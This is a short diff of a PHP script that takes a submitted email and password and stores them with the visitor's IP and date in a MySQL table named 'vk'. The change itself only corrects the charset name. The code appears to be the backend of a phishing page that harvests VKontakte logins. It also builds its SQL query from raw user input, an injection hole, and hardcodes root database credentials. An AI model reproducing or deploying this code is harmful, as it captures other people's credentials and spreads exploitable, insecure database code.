@@ -13,7 +13,7 @@
 	$pass = mb_strtolower($_POST['pass']);
 
 	$conn = mysqli_connect('localhost', 'root', '0000', 'vk') or die(mysqli_error($conn));
-	mysqli_set_charset($conn, "utf-8");
+	mysqli_set_charset($conn, "utf8");
 
 	mysqli_query($conn, "INSERT INTO vk values(NULL, '$email', '$pass', '$ip', '$date')") or die(mysqli_error($conn));
 
